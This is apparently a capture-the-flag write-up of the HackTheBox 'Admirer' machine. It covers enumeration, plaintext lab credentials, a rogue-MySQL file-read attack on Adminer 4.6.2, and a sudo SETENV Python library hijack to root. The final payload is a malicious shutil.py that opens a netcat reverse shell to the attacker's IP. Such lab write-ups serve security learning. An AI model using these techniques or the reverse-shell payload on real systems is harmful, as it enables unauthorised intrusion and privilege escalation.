## HTB - Admirer

## Overview

![Informational data about the machine Admirer](/assets/img/0-admirer-infocard.png)

An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability.  It also has an interesting new \(to me\) way to leverage sudo privileges to gain privilege escalation.  In all, this was a fun machine that taught me some interesting new tricks! This machine is on TJ_Null's list of OSCP-like machines.  Have fun!

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.187`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

```

Looking at the results of my nmap scan I saw that only ports 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\) were open.  

```text
zweilos@kali:~/htb/admirer$ ftp 10.10.10.187

Name (10.10.10.187:zweilos): anonymous                                                               
530 Permission denied.                                                                               
Login failed.
```

I started out by trying to log into FTP, but it did not allow anonymous access.

![Screenshot of the admirer website](/assets/img/1-admirer-website.png)

Next, I opened a browser to see what was being hosted over HTTP and found a website of someone who was an "Admirer of skills and visuals".  There did not seem to be anything useful on the site itself.

### robots.txt

![The contents of robots.txt](/assets/img/2-robots.txt.png)

Nmap pointed out that there was a `robots.txt` file, so I checked it out.  I found a potential username `waldo` and also a folder `admin-dir`.  

![The output of dirbuster showing useful files](/assets/img/3-dirbuster.png)

Navigating directly to that page gave me an access forbidden error, so I fired up Dirbuster and ran it on this directory.  This led me to a few useful sounding files: `contacts.txt` and `credentials.txt`. 

```text
##########
# admins #
##########
# Penny

##############

Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

The file `contacts.txt` contained some more potential usernames and a potentially useful email address format. I also noticed that `waldo` seemed to be a fan of The Big Bang Theory tv show, which could also be useful information. 

```text
[Internal mail account]

fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

`credentials.txt` contained credentials for a few services, so I added them to my `users` and `passwords` files.  

## Initial Foothold

Next I used `hydra` to attempt a brute-force attack against SSH to see if any of the credentials would allow me to log in.

```text

```

The FTP credentials seemed to also work for SSH! However, the connection was closed immediately upon logging in.  After trying various ways to bypass this and failing, I moved on to try the credentials for FTP instead.

```text
zweilos@kali:~/htb/admirer$ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)

226 Directory send OK.
```

Using the ftp credentials, I was able to log into the FTP server.  I found a few interesting files and exfiltrated them back to my machine for analysis.

### The database backup

![Image showing the database dump.sql](/assets/img/4.1-database.png)

The file `dump.sql` contained a dump of the website database. Unfortunately,  it seemed as if the only useful information was the server version information and the database name and the name of a deleted table that looked to contain website files. I thought that this information could come in handy so I made note of it.

* **Database:** admirerdb
* **Table**: items \(deleted\)
* **Version**: MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu \(x86\_64\)

![Image of the Employees table in the database](/assets/img/4.1-database2.png)

The `Employees3` table had another list of potential usernames and email addresses that I added to my lists.

### Back-end code backup

![Zipped backup of the HTML code](/assets/img/4.2-html.png)

After fully checking out the database, I moved on to the file `html.tar.gz`. I decompressed the tar file with `gunzip` and found that it contained a backup of the website's back-end code, including a very interesting PHP file called `admin_tasks.php` in the `/utility-scripts/` folder. 

![Admin tasks backdoor](/assets/img/4.5-admintasks.png)

This file looked like a nice little backdoor that the admin had left for me called the "Admin Tasks Web Interface \(v0.01 beta\)". I was very interested in options 4 through 7, which could potentially give me very sensitive system information.  

![PHP file containing waldo user credentials](/assets/img/4.6-db_admin.png)

in the same folder was `db_admin.php` which contained another set of credentials, this time for the user `waldo` who I had seen in the `robots.txt`. 

![Another password for Waldo in the index.php file](/assets/img/4.7-indexphp.png)

There was also another password for `waldo` in the `index.php` file.  This also referenced the `items` table that had been deleted from the database I exfiltrated.  If I could get a web shell into this table, the page would run it for me when the page loaded.

```text
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
```

Inside this HTML backup was a different version of the `robots.txt`.  This time the disallowed folder was called `/w4ld0s_s3cr3t_d1r/`, which I had access to as a folder in the backup.  This folder contained the files `contacts.txt` and `credentials.txt` which appeared at first to be the same as before.

```text
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

The `credentials.txt` had most of the same information as before, but `waldo` seemed to have left his bank account password in this one.  Despite finding a couple more passwords, none of these worked for logging into SSH for any user.

![Website for running administrative tasks on the server](/assets/img/4-admin-tasks.png)

I navigated to `http://10.10.10.187/utility-scripts/admin_tasks.php` which brought me to a website for running administrative tasks on the server.  

![Admin tasks is running as the user www-data](/assets/img/4.9-admin-tasks.png)

I didn't find much useful other than the fact that the page was running in the context of the `www-data` user. 

![Disable script with insuficient privileges](/assets/img/4.8-admin-tasks.png)

I tried to run the disabled scripts, which gave the message:  `Insufficient privileges to perform the selected operation.`

![Adminer database management portal](/assets/img/5-adminer.png)

After I checked back on my Dirbuster scan of the `/utility-scripts/` folder, I noticed it had found a new page `adminer.php` where I found an adminer database management portal. 

![I found the adminer version](/assets/img/6-adminer.png)

I noticed the version was 4.6.2, though the page said right next to it that there was a version 4.7.7 available to download. A search for adminer 4.6.2 exploit brought me to [https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). This led to [https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw), which in turn linked to a MySQL exploit on GitHub at [https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue\_mysql\_server.py](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py).  I also found a few other references that gave a pretty clear picture of how to exploit this particular web SQL management portal.

* [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) 
* [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)

To sum all of this up, the easiest way to exploit this portal is to set up a local MySQL database and have the remote server connect to it.  I found instructions for how to do this at [https://www.microfocus.com/documentation/idol/IDOL\_12\_0/MediaServer/Guides/html/English/Content/Getting\_Started/Configure/\_TRN\_Set\_up\_MySQL\_Linux.htm](https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm)

## Road to User

### The rogue MySQL server

I did a bit more research to figure out exactly how to set up the MySQL database.  The following articles gave me the last bits of information I didn't already know \(specifically, how to create a user and assign it permissions\).

* [https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/) 
* [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)

```sql
zweilos@kali:/etc/mysql/conf.d$ service mysql start
zweilos@kali:/etc/mysql/conf.d$ sudo su -

Bye
root@kalimaa:~# exit
logout
```

After creating the database and a table called `admirer`, I created a user named `test` and gave it full permissions to manage the database.  

```text
zweilos@kali:/etc/mysql/mariadb.conf.d$ ls
50-client.cnf  50-mysql-clients.cnf  50-mysqld_safe.cnf  50-server.cnf
zweilos@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
```

![Changing the settings for mariadb](/assets/img/5.5-config-file.png)

Next I had to set the binding for the server to the address `0.0.0.0` so that the external service could connect to it by my IP.  The default is `127.0.0.1` which is localhost only.

```text
zweilos@kali:/etc/mysql/conf.d$ service mysql stop
zweilos@kali:/etc/mysql/conf.d$ service mysql start
```

After changing the server `bind-address` setting to `0.0.0.0` I had to restart the `mysql` service for it to take effect. After that I was able to login to my database in the Adminer portal.

![Logging into the adminer portal](/assets/img/6-adminer-login%20%281%29.png)

### Finding user creds

This bug bounty write-up detailed what I needed to do next. Essentially, I logged into the remote server's database management portal, but it was my own local database that I logged into.  After that, I abused a feature of MySQL that allows for local files to be imported into the database.  This is a type of local file inclusion \(LFI\) vulnerability.  

* [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' 
INTO TABLE admirer.test
FIELDS TERMINATED BY "\n"
```

![The administrative portal being used to test for LFI](/assets/img/7-failed-local-inclusion%20%282%29%20%282%29%20%282%29%20%282%29%20%282%29%20%281%29.png)

To test for the local file inclusion vulnerability I first tried to get `/etc/passwd` but was denied access to that file. Since I was fairly sure that this portal was still only running in the context of `www-data` I decided to try to get a file I knew I could access: `index.php`.

![Successful attempt to include local files](/assets/img/8-local-inclusion-success.png)

I wasn't even sure that this was going to work, but to my surprise it retrieved the file and added it to my database. I now had a way to read through the source code of the production website as opposed to the backups I downloaded earlier.

![Another password was found in the source code](/assets/img/9-yet-another-password.png)

Much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.

I had finally found a usable password for `waldo`!  I hoped that it wouldn't just kick me out like it had with `ftpuser`. 

### User.txt

## Path to Power \(Gaining Administrator Access\)

### Enumeration as user `waldo`

```bash
waldo@admirer:~$ id && hostname
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
admirer
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

One of the first things I always do when gaining access to a new user is to check what privileges I have with `sudo -l`.  I was pleasantly surprised to get a result back that I was able to do something with a bash script called `admin_tasks.sh`.  I was curious about what this script did, and also what the group `admins` could access.  

```text
waldo@admirer:~$ find / -group admins 2>/dev/null
/opt/scripts
/opt/scripts/backup.py
/opt/scripts/admin_tasks.sh
```

Hmm...so the admins group only has access to this `scripts` folder.  Time to check out the bash script.

```bash
#!/bin/bash

    /usr/bin/uptime -p

This bash script seemed to be a completed version of the PHP version of admin-tasks I had seen earlier.  Inside the script it references a few other files:

* `/opt/scripts/backup.py`
* `/srv/ftp/dump.sql` - _this is the one I found through the ftp server I think_
* `/var/backups/dump.sql`

```bash
waldo@admirer:/opt/scripts$ sudo ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file

7) Backup DB
8) Quit

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line

```

I ran the option for viewing the root crontab and noticed that it was set to clear out files every 3 minutes.  It looked like putting files in `/tmp/` or files with an extension starting in `p` in `waldo`'s home directory would be a short-lived affair.

```

I was also able to run the script to backup the SQL database, `/etc/passwd`, and `/etc/shadow`. Unfortunately, each of the backup files were owned by `root` so I had no way to read them.  

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

The one function that looked a bit different from the others was the one that backed up the HTML files for the website.  This one called a separate python script, which would also be run as root, so I decided to check it out as well.

```python
!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

The file `/opt/scripts/backup.py` that the bash script referenced to do the web backup contained code that seemed potentially useful. 

### SETENV and sudo

I had an idea that since this python script was being run as root that maybe I could get it to read a file of my choice, however all of the files referenced in the python script has absolute paths so no no hijacking seemed possible there. 

I did some research for `sudo setenv python` since I saw in my `sudo -l` output the word `SETENV` listed in front of the bash script I could run. In the search results was a very interesting article that talked about hijacking python library imports.

This sounded exactly like the situation I had found.

```python
import os

def make_archive():
    os.system('/bin/bash')
    os.system('echo I am g`whoami`')
```

Armed with this information, I wrote a short python library to replace the one referenced in the script.  I named it `shutil.py` so the script would call it instead of the real one, and also made a function named `make_archive()` since this was what was specifically being imported.  I wrote my function so that it would create a bash shell, and then echo my new username.  

```python
waldo@admirer:/dev/shm$ vi shutil.py 
waldo@admirer:/dev/shm$ nano shutil.py
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh

```

After trial and error, I was able to get my library to be loaded and executed, though I did not get a shell like I expected. However, I could see that the output of the `whoami` command did appear, so I had proof that I could run commands as root. 

I got an error when trying to exploit this with version one of my evil python library, but that error also confirmed that I was making progress. It told me that my `make_archive()` function takes 0 positional arguments but the script that was calling it was feeding it three.

```python
import os

def make_archive(a, b, c):
    os.system('/bin/bash')
    os.system('echo I am g`whoami`'')
    os.system('nc 10.10.15.57 12345 -e /bin/bash')
```

I modified my function to take 3 arguments \(which I didn't use for anything\), and also added a line to send me a reverse shell since calling a new shell wasn't working, and then it worked just fine. I didn't expect the version of `nc` that was installed to have `-e` capability, but I was happy it did!

```python
waldo@admirer:/dev/shm$ nano shutil.py 
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
